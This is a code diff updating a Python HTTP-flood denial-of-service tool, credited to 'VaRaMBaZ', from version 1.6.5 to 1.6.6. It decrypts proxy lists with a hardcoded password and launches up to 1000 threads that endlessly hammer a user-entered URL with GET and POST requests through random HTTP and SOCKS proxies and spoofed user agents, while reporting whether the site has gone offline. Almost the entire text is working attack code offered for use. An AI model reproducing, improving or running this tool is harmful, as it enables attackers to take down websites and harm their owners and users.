@@ -1,12 +1,12 @@
+import time
 import colorama
-from colorama import Style
 import threading
 import random
 import requests
 import cfscrape
 import os
 import pyAesCrypt
-import time
+from numba import prange
 
 os.system("clear")
 
@@ -16,11 +16,10 @@ s = cfscrape.create_scraper()
 with open('useragent') as file:
     headersp = ''.join(file.readlines()).strip().split('\n')
 
-# Шифрование и получение прокси
+#Расшифровка прокси
 filedecrypthttp = "proxyhttp.crp"
 filedecryptsocks = "proxysocks.crp"
 password = "0xdrqdsdwgfegvefgtruoobcdsm"
-
 
 def decryptionhttp():
     buffer_size = 512 * 1024
@@ -39,80 +38,54 @@ decryptionsocks()
 with open('proxysocks') as file:
     proxy_socks = ''.join(file.readlines()).strip().split('\n')
 os.remove("proxysocks")
-# Запуск потоков
 
-def dospause1(barrier, url):
-    barrier.wait()
-    dos1(url)
-
-def dospause2(barrier, url):
-    barrier.wait()
-    dos2(url)
-
-# Аттака
 def dos1(target):
     while True:
+        #FakeUserAgent
         useragent = random.choice(headersp)
-        header = {'user-agent': useragent}
-
         useragent2 = random.choice(headersp)
-        header2 = {'user-agent': useragent2}
+        useragent3 = random.choice(headersp)
+        useragent4 = random.choice(headersp)
+        useragent5 = random.choice(headersp)
 
+        #RandomProxy
         proxyagenthttp = random.choice(proxy_http)
         proxyagentsocks = random.choice(proxy_socks)
-        proxieshttphttp = {
-            'http': f'http://{proxyagenthttp}'
-        }
-        proxieshttphttps = {
-            'https': f'http://{proxyagenthttp}'
-        }
-        proxiessockshttp = {
-            'http': f'socks5://{proxyagentsocks}'
-        }
-        proxiessockshttps = {
-            'https': f'socks5://{proxyagentsocks}'
-        }
+        proxyagenthttp2 = random.choice(proxy_http)
+        proxyagentsocks2 = random.choice(proxy_socks)
+        proxyagenthttp3 = random.choice(proxy_http)
 
+        #Запросы GET
         try:
-            s.get(target, headers=header, proxies=proxieshttphttp)
+            s.get(target, headers={'user-agent': useragent}, proxies={'http': proxyagenthttp, 'https': proxyagenthttp})
         except:
             pass
 
         try:
-            s.post(target, headers=header2, proxies=proxieshttphttp)
+            s.get(target, headers={'user-agent': useragent2}, proxies={'http': proxyagentsocks, 'https': proxyagentsocks})
+        except:
+            pass
+
+        #Запросы POST
+        try:
+            s.post(target, headers={'user-agent': useragent3}, proxies={'http': proxyagenthttp2, 'https': proxyagenthttp2})
         except:
             pass
 
         try:
-            s.get(target, headers=header, proxies=proxieshttphttps)
+            s.post(target, headers={'user-agent': useragent4}, proxies={'http': proxyagentsocks2, 'https': proxyagentsocks2})
         except:
             pass
 
         try:
-            s.post(target, headers=header2, proxies=proxieshttphttps)
+            checksite = requests.post(url, headers={'user-agent': useragent5}, proxies={'http': proxyagenthttp3, 'https': proxyagenthttp3})
+            if checksite.status_code >= 500:
+                statustext = "OFF_LINE"
+            else:
+                statustext = "ON_LINE"
         except:
             pass
-
-        try:
-            s.get(target, headers=header, proxies=proxiessockshttp)
-        except:
-            pass
-
-        try:
-            s.post(target, headers=header2, proxies=proxiessockshttp)
-        except:
-            pass
-
-        try:
-            s.get(target, headers=header, proxies=proxiessockshttps)
-        except:
-            pass
-
-        try:
-            s.post(target, headers=header2, proxies=proxiessockshttps)
-        except:
-            pass
-        
+        print("\r Check Site | Status: ", checksite.status_code, " | ", statustext, end='')
 
 def dos2(target):
     while True:
@@ -133,7 +106,8 @@ print("   \\-\    //-/    //========\\-\   ||=========     ||    |=-|  ||     |-
 print("    \\-\  //-/    //-/        \\-\  ||-|     \\-\    ||    |=-|  ||     |-|   ___|| |-|   ")
 print("     \\-\//-/    //-/          \\-\ ||-|      \\-\   ||====/-/   \\=====/-/ ||======|-| \n")
 print("Creator: VaRaMBaZ")
-print("Version: 1.6.5; Add check site status \n")
+print("Version: 1.6.6; Fixed bugs \n")
+
 
 url = input("URL: ")
 if not url.__contains__("http"):
@@ -143,44 +117,23 @@ if not url.__contains__("."):
     exit(colorama.Fore.RED + "Invalid domain")
 
 try:
-    threads = int(input("Threads[max 3000]: "))
+    threads = int(input("Threads[max 1000]: "))
 except ValueError:
     exit(colorama.Fore.RED + "Threads count is incorrect!")
 
-if threads == 0 or threads > 3000:
+if threads == 0 or threads > 1000:
     exit(colorama.Fore.RED + "Threads count is incorrect!")
 
-bar = threading.Barrier(threads)
 proxyuseage = int(input("Use a proxy?[1-yes; 2-no]: "))
 print("")
 
 print(colorama.Fore.YELLOW + "Starting threads...")
 if proxyuseage == 1:
-    for i in range(0, threads):
-        thr = threading.Thread(target=dospause1, args=(bar, url, ))
+    for i in prange(0, threads):
+        thr = threading.Thread(target=dos1, args=(url,))
         thr.start()
 else:
-    for i in range(0, threads):
-        thr2 = threading.Thread(target=dospause2, args=(bar, url, ))
+    for i in prange(0, threads):
+        thr2 = threading.Thread(target=dos2, args=(url,))
         thr2.start()
 print(colorama.Fore.GREEN + "All threads are running!")
-print(Style.RESET_ALL)
-
-while True:
-    useragent = random.choice(headersp)
-    header = {'user-agent': useragent}
-    
-    proxyagenthttp = random.choice(proxy_http)
-    proxieshttphttp = {
-        'http': f'http://{proxyagenthttp}',
-        'https': f'http://{proxyagenthttp}',
-    }
-    try:
-        checksite = requests.post(url, headers=header, proxies=proxieshttphttp)
-        if checksite.status_code >= 500:
-            statustext = "OFF_LINE"
-        else:
-            statustext = "ON_LINE" 
-    except:
-        pass
-    print("\r Check Site | Status: ", checksite.status_code, " | ", statustext, end='')
